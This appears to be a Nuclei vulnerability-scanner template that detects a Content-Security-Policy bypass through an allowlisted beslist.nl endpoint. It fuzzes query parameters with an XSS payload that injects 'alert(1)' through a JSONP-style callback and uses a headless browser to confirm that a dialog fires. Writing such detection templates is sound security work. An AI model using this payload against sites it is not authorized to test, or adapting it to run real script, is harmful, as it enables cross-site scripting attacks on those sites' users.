flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - beslist_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://ct.beslist.nl/ct_refresh?shopid=%22;%0a%0dalert(1);%20//%20"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: beslist_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - beslist.nl
  method: GET
  path:
  - '{{BaseURL}}'
id: beslist-csp-bypass
info:
  author: Jaenact
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - beslist.nl
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,beslist-api,vuln
